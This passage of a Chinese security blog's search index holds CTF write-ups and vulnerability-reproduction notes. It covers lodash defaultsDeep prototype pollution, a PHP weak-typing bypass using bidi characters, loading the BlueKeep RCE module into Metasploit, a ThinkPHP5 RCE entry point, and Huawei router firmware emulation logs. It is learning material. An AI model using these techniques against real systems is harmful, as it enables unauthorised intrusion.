\u9898\u76ee\u4e2d\u4f7f\u7528defaultDeep\u6765\u8fdb\u884c\u62f7\u8d1d\u8d4b\u503c\u64cd\u4f5c\uff0c\u8fd9\u91cc\u4f7f\u7528json.parse\u6765\u63a5\u7eedbody\u4e2d\u7684json\u6570\u636e\uff0c\u5e76\u4e14json\u6570\u636e\u662f\u53ef\u63a7\u7684\uff0c\u6ca1\u6709\u8fc7\u6ee4\u7684 1 2 3 4 5 6 7 8 flagBp . constructor = { prototype : bpProto } flagBp . __proto__ = bpProto user = { bpProto , blueprints : { [ makeId ()] : flagBp , }, } \u6ce8\u610f\u5230\u8fd9\u91cc\u9898\u76eeflag\u5bf9\u5e94\u7684\u952e\u540d\u4e3acontent\uff0c\u5e76\u4e14\u5305\u542bcontent\u7684\u662f{}\uff0c\u6240\u4ee5\u8fd9\u91cc\u5e94\u8be5\u901a\u8fc7defaultDeep\u6765\u4f7f\u539f\u578b\u6307\u5411\u5230{}\u7684\u539f\u578b\uff0c\u4ece\u800c\u6765\u5bf9\u5176\u5c5e\u6027\u8fdb\u884c\u6ce8\u5165\u3002 \u8fd9\u91cc\u5982\u679c\u53ea\u662f\u6ce8\u5165\u5355\u7eaf\u7684content\u5c5e\u6027\u7684\u8bdd\uff0c\u76f8\u5f53\u4e8e\u6267\u884c{}.\"content\"={}.\"content\"\uff0c\u8fd9\u91cc\u8fd9\u6837\u4e0d\u80fd\u64cd\u63a7\u6211\u4eec\u524d\u9762\u6240\u8c13\u7684\u952e\u540d\uff0c\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u591a\u4f20\u9012\u4e00\u4e2a\"constructor\"\u7684\u6784\u9020\u5668\u5c5e\u6027\uff0c\u6765\u6784\u6210 {}.\"constructor\".\"protype\" \u5176\u5b9e a.constructor.prototype == a.__proto__","title":"redpwnctf2019"},{"location":"writeup/redpwnctf2019/#redpwnctf2019","text":"","title":"redpwnctf2019"},{"location":"writeup/redpwnctf2019/#_1","text":"1 2 3 4 5 6 7 8 9 10 try { // default values are easier to do than proper input validation const mergeObj = {} mergeObj . constructor = { prototype : user . bpProto } mergeObj . __proto__ = user . bpProto parsedBody = _ . defaultsDeep ( mergeObj , JSON . parse ( body )) } catch ( e ) { res . end ( 'bad json' ) return } \u7b97\u662f\u4eca\u5e74\u521a\u521a\u7206\u51fa\u7684\u4e00\u4e2a\u6f0f\u6d1e\u4e86\uff0c\u5176\u5b9ejs\u7684\u5f88\u591a\u5e93\u90fd\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898 \u9898\u76ee\u4e2d\u4f7f\u7528defaultDeep\u6765\u8fdb\u884c\u62f7\u8d1d\u8d4b\u503c\u64cd\u4f5c\uff0c\u8fd9\u91cc\u4f7f\u7528json.parse\u6765\u63a5\u7eedbody\u4e2d\u7684json\u6570\u636e\uff0c\u5e76\u4e14json\u6570\u636e\u662f\u53ef\u63a7\u7684\uff0c\u6ca1\u6709\u8fc7\u6ee4\u7684 1 2 3 4 5 6 7 8 flagBp . constructor = { prototype : bpProto } flagBp . __proto__ = bpProto user = { bpProto , blueprints : { [ makeId ()] : flagBp , }, } \u6ce8\u610f\u5230\u8fd9\u91cc\u9898\u76eeflag\u5bf9\u5e94\u7684\u952e\u540d\u4e3acontent\uff0c\u5e76\u4e14\u5305\u542bcontent\u7684\u662f{}\uff0c\u6240\u4ee5\u8fd9\u91cc\u5e94\u8be5\u901a\u8fc7defaultDeep\u6765\u4f7f\u539f\u578b\u6307\u5411\u5230{}\u7684\u539f\u578b\uff0c\u4ece\u800c\u6765\u5bf9\u5176\u5c5e\u6027\u8fdb\u884c\u6ce8\u5165\u3002 \u8fd9\u91cc\u5982\u679c\u53ea\u662f\u6ce8\u5165\u5355\u7eaf\u7684content\u5c5e\u6027\u7684\u8bdd\uff0c\u76f8\u5f53\u4e8e\u6267\u884c{}.\"content\"={}.\"content\"\uff0c\u8fd9\u91cc\u8fd9\u6837\u4e0d\u80fd\u64cd\u63a7\u6211\u4eec\u524d\u9762\u6240\u8c13\u7684\u952e\u540d\uff0c\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u591a\u4f20\u9012\u4e00\u4e2a\"constructor\"\u7684\u6784\u9020\u5668\u5c5e\u6027\uff0c\u6765\u6784\u6210 {}.\"constructor\".\"protype\" \u5176\u5b9e a.constructor.prototype == a.__proto__","title":"\u6f0f\u6d1e\u70b9\u5206\u6790"},{"location":"writeup/\u5357\u90aectf/","text":"\u5357\u90aectf \u00b6 \u53d6\u4e2a\u540d\u5b57\u771f\u96be | Web \u00b6 \u8fd9\u9898\u662f\u771f\u7684\u5fd8\u8bb0\u505a\u4e86\uff0c\u597d\u597d\u590d\u4e60\u4e00\u4e0b\uff0c\u5176\u5b9e\u8fd8\u662f\u5bf9\u4e8ephp\u7684\u5f31\u7c7b\u578b\u4e86\u89e3\u7684\u4e0d\u591f\u6df1\u5165 \u7ed9\u4e86\u6e90\u7801\uff1a 1 \u95ee\u9898\u5f88\u5947\u602a\uff1a \u6211\u672c\u5730\u8c03\u8bd5\u7684\u65f6\u5019\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 <?php function noother_says_correct ( $number ) { $one = ord ( '1' ); $nine = ord ( '9' ); for ( $i = 0 ; $i < strlen ( $number ); $i ++ ) { $digit = ord ( $number { $i }); if ( ( $digit >= $one ) && ( $digit <= $nine ) ) { return false ; } } return $number == '54975581388' ; } $flag = '*******' ; echo var_dump ( noother_says_correct ( \"0x\u202dCCCCCCCCC\u202c\" )); ?> \u5c45\u7136\u8fd9\u6837\u4e5f\u884c\uff0c\u5e08\u5085tql","title":"\u5357\u90aectf"},{"location":"writeup/\u5357\u90aectf/#ctf","text":"","title":"\u5357\u90aectf"},{"location":"writeup/\u5357\u90aectf/#web","text":"\u8fd9\u9898\u662f\u771f\u7684\u5fd8\u8bb0\u505a\u4e86\uff0c\u597d\u597d\u590d\u4e60\u4e00\u4e0b\uff0c\u5176\u5b9e\u8fd8\u662f\u5bf9\u4e8ephp\u7684\u5f31\u7c7b\u578b\u4e86\u89e3\u7684\u4e0d\u591f\u6df1\u5165 \u7ed9\u4e86\u6e90\u7801\uff1a 1 \u95ee\u9898\u5f88\u5947\u602a\uff1a \u6211\u672c\u5730\u8c03\u8bd5\u7684\u65f6\u5019\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 <?php function noother_says_correct ( $number ) { $one = ord ( '1' ); $nine = ord ( '9' ); for ( $i = 0 ; $i < strlen ( $number ); $i ++ ) { $digit = ord ( $number { $i }); if ( ( $digit >= $one ) && ( $digit <= $nine ) ) { return false ; } } return $number == '54975581388' ; } $flag = '*******' ; echo var_dump ( noother_says_correct ( \"0x\u202dCCCCCCCCC\u202c\" )); ?> \u5c45\u7136\u8fd9\u6837\u4e5f\u884c\uff0c\u5e08\u5085tql","title":"\u53d6\u4e2a\u540d\u5b57\u771f\u96be | Web"},{"location":"\u6f0f\u6d1e\u5206\u6790/0708/","text":"Windows RDP \u670d\u52a1\u9ad8\u5371\u6f0f\u6d1e\u5206\u6790 \u00b6 metasploit\u57fa\u7840 \u00b6 kali\u4e0bmetasploit\u5b58\u50a8\u8def\u5f84 /usr/share/metasploit-framework \u5177\u4f53\u6bcf\u4e2a\u6587\u4ef6\u5939\u5b58\u653e\u7684\u5185\u5bb9 \u6d41\u7a0b\u5982\u4e0b\uff1a \u9996\u5148\u66ff\u6362\u539fmsf\u7684\u76f8\u540c\u76ee\u5f55\u4e0b\u4e09\u4e2a\u6587\u4ef6\uff0c\u5982\u4e0b\uff1a lib/msf/core/exploit/rdp.rb modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb modules/auxiliary/scanner/rdp/rdp_scanner.rb \u7136\u540e\u52a0\u8f7d\u65b0\u76840708exp\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e86,exp\u4e3acve_2019_0708_bluekeep_rce.rb \u542f\u52a8msf\u540e\u6267\u884creload_all \u7136\u540esearch 0708\u5c31\u53ef\u4ee5\u4f7f\u7528\u5566\u3002 \u52a0\u8f7d\u6a21\u5757 \u00b6 \u5f88\u9057\u61be\u8fd9\u4e00\u6b65\u5931\u8d25\u4e86 \u62a5\u9519\u4fe1\u606f\u6458\u5f55\u4e0b\uff1a 1 \u5e94\u8be5\u662f\u8fd9\u53e5\u8bdd\uff1a 1 include Msf::Exploit::Remote::RDP \u6ca1\u6709\u8fd9\u4e2a\u5c31\u5f88\u5c34\u5c2c\u4e86 \u542c\u4ece\u5b66\u957f\u7684\u5efa\u8bae\u66f4\u65b0\u4e86\u4e00\u4e0b metasploit 1 apt update; apt install metasploit-framework \u53c8\u9047\u5230\u9519\u8bef \u00b6 \u91cd\u65b0\u628a\u6a21\u5757\u79fb\u51fa\u6765\u7136\u540e\u53c8\u52a0\u8f7d\u4e86\u4e00\u4e0b\u6210\u529f\u4e86 exploit \u00b6 \u4ece\u53e6\u4e00\u8fb9\u4e5f\u53ef\u4ee5\u770b\u5230\u6210\u529f\u5730\u8fde\u63a5\u4e86\uff0c\u4f46\u662f\u6ca1\u6709\u5f39shell \u633a\u795e\u5947\u7684\u6709\u673a\u4f1a\u7814\u7a76\u4e00\u4e0b\u6f0f\u6d1e\u539f\u7406 \u53c2\u8003 \u00b6 Windows RDP \u670d\u52a1\u9ad8\u5371\u6f0f\u6d1e\u5206\u6790 bilibili up\u4e3b\u89c6\u9891 exp\u4ee3\u7801","title":"Windows RDP \u670d\u52a1\u9ad8\u5371\u6f0f\u6d1e\u5206\u6790"},{"location":"\u6f0f\u6d1e\u5206\u6790/0708/#windows-rdp","text":"","title":"Windows RDP \u670d\u52a1\u9ad8\u5371\u6f0f\u6d1e\u5206\u6790"},{"location":"\u6f0f\u6d1e\u5206\u6790/0708/#metasploit","text":"kali\u4e0bmetasploit\u5b58\u50a8\u8def\u5f84 /usr/share/metasploit-framework \u5177\u4f53\u6bcf\u4e2a\u6587\u4ef6\u5939\u5b58\u653e\u7684\u5185\u5bb9 \u6d41\u7a0b\u5982\u4e0b\uff1a \u9996\u5148\u66ff\u6362\u539fmsf\u7684\u76f8\u540c\u76ee\u5f55\u4e0b\u4e09\u4e2a\u6587\u4ef6\uff0c\u5982\u4e0b\uff1a lib/msf/core/exploit/rdp.rb modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb modules/auxiliary/scanner/rdp/rdp_scanner.rb \u7136\u540e\u52a0\u8f7d\u65b0\u76840708exp\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e86,exp\u4e3acve_2019_0708_bluekeep_rce.rb \u542f\u52a8msf\u540e\u6267\u884creload_all \u7136\u540esearch 0708\u5c31\u53ef\u4ee5\u4f7f\u7528\u5566\u3002","title":"metasploit\u57fa\u7840"},{"location":"\u6f0f\u6d1e\u5206\u6790/0708/#_1","text":"\u5f88\u9057\u61be\u8fd9\u4e00\u6b65\u5931\u8d25\u4e86 \u62a5\u9519\u4fe1\u606f\u6458\u5f55\u4e0b\uff1a 1 \u5e94\u8be5\u662f\u8fd9\u53e5\u8bdd\uff1a 1 include Msf::Exploit::Remote::RDP \u6ca1\u6709\u8fd9\u4e2a\u5c31\u5f88\u5c34\u5c2c\u4e86 \u542c\u4ece\u5b66\u957f\u7684\u5efa\u8bae\u66f4\u65b0\u4e86\u4e00\u4e0b metasploit 1 apt update; apt install metasploit-framework","title":"\u52a0\u8f7d\u6a21\u5757"},{"location":"\u6f0f\u6d1e\u5206\u6790/0708/#_2","text":"\u91cd\u65b0\u628a\u6a21\u5757\u79fb\u51fa\u6765\u7136\u540e\u53c8\u52a0\u8f7d\u4e86\u4e00\u4e0b\u6210\u529f\u4e86","title":"\u53c8\u9047\u5230\u9519\u8bef"},{"location":"\u6f0f\u6d1e\u5206\u6790/0708/#exploit","text":"\u4ece\u53e6\u4e00\u8fb9\u4e5f\u53ef\u4ee5\u770b\u5230\u6210\u529f\u5730\u8fde\u63a5\u4e86\uff0c\u4f46\u662f\u6ca1\u6709\u5f39shell \u633a\u795e\u5947\u7684\u6709\u673a\u4f1a\u7814\u7a76\u4e00\u4e0b\u6f0f\u6d1e\u539f\u7406","title":"exploit"},{"location":"\u6f0f\u6d1e\u5206\u6790/0708/#_3","text":"Windows RDP \u670d\u52a1\u9ad8\u5371\u6f0f\u6d1e\u5206\u6790 bilibili up\u4e3b\u89c6\u9891 exp\u4ee3\u7801","title":"\u53c2\u8003"},{"location":"\u6f0f\u6d1e\u5206\u6790/metasploit\u5f00\u53d1/","text":"\u5f00\u53d1\u81ea\u5df1\u7684metasploit\u6a21\u5757 \u00b6 \u53c2\u8003 \u00b6 metasploit\u6a21\u5757\u79fb\u690d/\u5f00\u53d1--python\u7bc7 \u4e4c\u4e91 WordPress Plugin IMDb","title":"\u5f00\u53d1\u81ea\u5df1\u7684metasploit\u6a21\u5757"},{"location":"\u6f0f\u6d1e\u5206\u6790/metasploit\u5f00\u53d1/#metasploit","text":"","title":"\u5f00\u53d1\u81ea\u5df1\u7684metasploit\u6a21\u5757"},{"location":"\u6f0f\u6d1e\u5206\u6790/metasploit\u5f00\u53d1/#_1","text":"metasploit\u6a21\u5757\u79fb\u690d/\u5f00\u53d1--python\u7bc7 \u4e4c\u4e91 WordPress Plugin IMDb","title":"\u53c2\u8003"},{"location":"\u6f0f\u6d1e\u5206\u6790/thinkphp5\u6f0f\u6d1e\u8ddf\u8e2a/","text":"thinkphp5 rce \u00b6 wulidecade\u5e08\u5085\u7684\u5206\u6790 \u00b6 \u6211\u53ea\u80fd\u8bf4\u670d\u4e86\uff0c\u8fd9\u90fd9\u6708\u4efd\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\u5c45\u7136\u8fd8\u5b58\u5728\u3002\u3002 \u6211\u4eec\u770b\u4e0b\u6700\u540e\u7684\u62a5\u9519\uff1a \u5f88\u660e\u663e\u770b\u5230\u4e00\u4e2a\u5371\u9669\u51fd\u6570 call_user_func \u540c\u65f6\u67e5\u770b\u51fd\u6570\u5806\u6808\uff1a \u6f0f\u6d1e\u5165\u53e3 \u00b6 /thinkphp/library/think \u76ee\u5f55\u4e0b\uff1a App.php \u6587\u4ef6","title":"thinkphp5 rce"},{"location":"\u6f0f\u6d1e\u5206\u6790/thinkphp5\u6f0f\u6d1e\u8ddf\u8e2a/#thinkphp5-rce","text":"","title":"thinkphp5 rce"},{"location":"\u6f0f\u6d1e\u5206\u6790/thinkphp5\u6f0f\u6d1e\u8ddf\u8e2a/#wulidecade","text":"\u6211\u53ea\u80fd\u8bf4\u670d\u4e86\uff0c\u8fd9\u90fd9\u6708\u4efd\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\u5c45\u7136\u8fd8\u5b58\u5728\u3002\u3002 \u6211\u4eec\u770b\u4e0b\u6700\u540e\u7684\u62a5\u9519\uff1a \u5f88\u660e\u663e\u770b\u5230\u4e00\u4e2a\u5371\u9669\u51fd\u6570 call_user_func \u540c\u65f6\u67e5\u770b\u51fd\u6570\u5806\u6808\uff1a","title":"wulidecade\u5e08\u5085\u7684\u5206\u6790"},{"location":"\u6f0f\u6d1e\u5206\u6790/thinkphp5\u6f0f\u6d1e\u8ddf\u8e2a/#_1","text":"/thinkphp/library/think \u76ee\u5f55\u4e0b\uff1a App.php \u6587\u4ef6","title":"\u6f0f\u6d1e\u5165\u53e3"},{"location":"\u6f0f\u6d1e\u5206\u6790/\u534e\u4e3a\u8def\u7531\u5668\u6f0f\u6d1e\u590d\u73b0\u8fc7\u7a0b/","text":"\u534e\u4e3a\u8def\u7531\u5668\u6f0f\u6d1e\u590d\u73b0\u8fc7\u7a0b \u00b6 \u8def\u7531\u5668\u4e0b\u8f7d\u5730\u5740 \u5c1d\u8bd5\u76f4\u63a5\u8fd0\u884c\u811a\u672c\u5931\u8d25\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 root@ml-vm:/home/oit/tools/fat# ./sources/extractor/extractor.py -b iot -sql 127.0.0.1 -np -nk \"./HG532e.rar\" images -----------------Extractor Start---------------- input:./HG532e.rar output:images rootfs:True kernel:False parallel:False sql:127.0.0.1 brand:iot -----------------Extractor End------------------ >> Database Image ID: 146 /home/oit/tools/fat/HG532e.rar >> MD5: 9986b8aee8e1eb511a8bbb3a39b485e4 >> Tag: 146 >> Temp: /tmp/tmpLXreHs >> Status: Kernel: True, Rootfs: False, Do_Kernel: False, Do_Rootfs: True >>>> RAR archive data, first volume type: MAIN_HEAD >> Recursing into archive ... Traceback (most recent call last): File \"./sources/extractor/extractor.py\", line 425, in extract File \"./sources/extractor/extractor.py\", line 472, in _check_archive File \"./sources/extractor/extractor.py\", line 693, in _check_recursive File \"./sources/extractor/extractor.py\", line 381, in extract UnicodeDecodeError: 'ascii' codec can't decode byte 0xd8 in position 37: ordinal not in range(128) >> Cleaning up /tmp/tmpLXreHs... \u6253\u7b97\u7528qemu\u8fd0\u884c\u4e00\u4e2a\u865a\u62df\u673a\u6765\u641e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@ml-vm:/mnt/hgfs/IOTEXP/_router HG532e.rar.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted# sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append \"root=/dev/sda1 console=tty0\" -nographic -net nic -net tap,ifname=br0,script=no,downscript=no [ 0.000000] Initializing cgroup subsys cpuset [ 0.000000] Initializing cgroup subsys cpu [ 0.000000] Linux version 2.6.32-5-4kc-malta (Debian 2.6.32-48squeeze4) (dannf@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 Tue Sep 24 00:02:22 UTC 2013 [ 0.000000] [ 0.000000] LINUX started... [ 0.000000] bootconsole [early0] enabled [ 0.000000] CPU revision is: 00019300 (MIPS 24Kc) [ 0.000000] FPU revision is: 00739300 [ 0.000000] Determined physical RAM map: [ 0.000000] memory: 00001000 @ 00000000 (reserved) ... [ 0.000000] SLUB: Genslabs=7, HWalign=64, Order=0-3, MinObjects=0, CPUs=1, Nodes=1 [ 0.000000] Hierarchical RCU implementation. [ 0.000000] NR_IRQS:256 [ 0.000000] CPU frequency 200.00 MHz [ 0.000000] Console: colour dummy device 80x25 [ 0.000000] console [tty0] enabled, bootconsole disabled \u4f46\u662f\u4e00\u76f4\u6ca1\u6709\u6253\u5f00shell","title":"\u534e\u4e3a\u8def\u7531\u5668\u6f0f\u6d1e\u590d\u73b0\u8fc7\u7a0b"},{"location":"\u6f0f\u6d1e\u5206\u6790/\u534e\u4e3a\u8def\u7531\u5668\u6f0f\u6d1e\u590d\u73b0\u8fc7\u7a0b/#_1","text":"\u8def\u7531\u5668\u4e0b\u8f7d\u5730\u5740 \u5c1d\u8bd5\u76f4\u63a5\u8fd0\u884c\u811a\u672c\u5931\u8d25\u4e86 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 root@ml-vm:/home/oit/tools/fat# ./sources/extractor/extractor.py -b iot -sql 127.0.0.1 -np -nk \"./HG532e.rar\" images -----------------Extractor Start---------------- input:./HG532e.rar output:images rootfs:True kernel:False parallel:False sql:127.0.0.1 brand:iot -----------------Extractor End------------------ >> Database Image ID: 146 /home/oit/tools/fat/HG532e.rar >> MD5: 9986b8aee8e1eb511a8bbb3a39b485e4 >> Tag: 146 >> Temp: /tmp/tmpLXreHs >> Status: Kernel: True, Rootfs: False, Do_Kernel: False, Do_Rootfs: True >>>> RAR archive data, first volume type: MAIN_HEAD >> Recursing into archive ... Traceback (most recent call last): File \"./sources/extractor/extractor.py\", line 425, in extract File \"./sources/extractor/extractor.py\", line 472, in _check_archive File \"./sources/extractor/extractor.py\", line 693, in _check_recursive File \"./sources/extractor/extractor.py\", line 381, in extract UnicodeDecodeError: 'ascii' codec can't decode byte 0xd8 in position 37: ordinal not in range(128) >> Cleaning up /tmp/tmpLXreHs... \u6253\u7b97\u7528qemu\u8fd0\u884c\u4e00\u4e2a\u865a\u62df\u673a\u6765\u641e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@ml-vm:/mnt/hgfs/IOTEXP/_router HG532e.rar.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted# sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append \"root=/dev/sda1 console=tty0\" -nographic -net nic -net tap,ifname=br0,script=no,downscript=no [ 0.000000] Initializing cgroup subsys cpuset [ 0.000000] Initializing cgroup subsys cpu [ 0.000000] Linux version 2.6.32-5-4kc-malta (Debian 2.6.32-48squeeze4) (dannf@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 Tue Sep 24 00:02:22 UTC 2013 [ 0.000000] [ 0.000000] LINUX started... [ 0.000000] bootconsole [early0] enabled [ 0.000000] CPU revision is: 00019300 (MIPS 24Kc) [ 0.000000] FPU revision is: 00739300 [ 0.000000] Determined physical RAM map: [ 0.000000] memory: 00001000 @ 00000000 (reserved) ... [ 0.000000] SLUB: Genslabs=7, HWalign=64, Order=0-3, MinObjects=0, CPUs=1, Nodes=1 [ 0.000000] Hierarchical RCU implementation. [ 0.000000] NR_IRQS:256 [ 0.000000] CPU frequency 200.00 MHz [ 0.000000] Console: colour dummy device 80x25 [ 0.000000] console [tty0] enabled, bootconsole disabled \u4f46\u662f\u4e00\u76f4\u6ca1\u6709\u6253\u5f00shell","title":"\u534e\u4e3a\u8def\u7531\u5668\u6f0f\u6d1e\u590d\u73b0\u8fc7\u7a0b"}]}